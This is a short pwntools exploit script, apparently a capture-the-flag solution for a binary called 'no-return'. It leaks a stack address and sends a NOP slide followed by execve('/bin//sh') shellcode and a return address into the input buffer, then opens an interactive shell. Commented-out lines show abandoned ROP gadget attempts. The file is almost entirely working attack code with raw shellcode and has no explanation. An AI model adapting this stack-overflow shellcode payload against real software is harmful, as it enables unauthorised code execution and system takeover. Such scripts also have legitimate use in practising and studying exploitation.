from pwn import *
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
p = process("./no-return")
raw_input('helo')

xchg_rax_rdx = p64(0x0000000000401067)
complicated_gadget = p64(0x000000000040104c)
bin_sh = p64(0x002f62696e2f7368)
sc= '\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'

nopSlide = '\x90' * 147
#pin = gdb.attach(p,gdbscript="""
#	b * 0x40106d
#	""")

pad = 152 * 'a'
stp = uu64(p.recv(8))

input_arr_addr = stp - 184
#loop_addr = bin_sh_addr +8
print "Leak: "+hex(stp)
#print "Addr of bin_sh: "+hex(bin_sh_addr)
#print "Addr of Loop: "+hex(loop_addr)


payload= ''
payload += nopSlide
payload += sc
payload += p64(input_arr_addr)
#payload += pad
#payload += xchg_rax_rdx
#payload += p64(0x0000000000401071)
#payload += p64(loop_addr)
p.sendline(payload)
p.interactive()


